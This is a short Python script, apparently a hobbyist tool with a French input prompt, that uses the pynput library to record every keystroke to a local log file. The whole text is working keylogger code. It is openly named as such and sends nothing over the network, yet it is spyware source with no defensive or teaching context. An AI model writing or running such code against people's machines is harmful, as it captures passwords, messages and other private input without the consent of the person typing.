from pynput.keyboard import Listener
import threading

class Keylogger:
    def __init__(self, log_file="keylog.txt"):
        self.log_file = log_file

    def on_press(self, key):
        try:
            with open(self.log_file, "a") as log:
                log.write(f"{key.char}")
        except AttributeError:
            with open(self.log_file, "a") as log:
                log.write(f" {key} ")

    def start(self):
        with Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    log_file = input("Entrer le nom pour le log file (default: keylog.txt): ").strip() or "keylog.txt"
    keylogger = Keylogger(log_file)
    print(f"Keylogger is running. Logs will be saved to {log_file}.")
    keylogger.start()
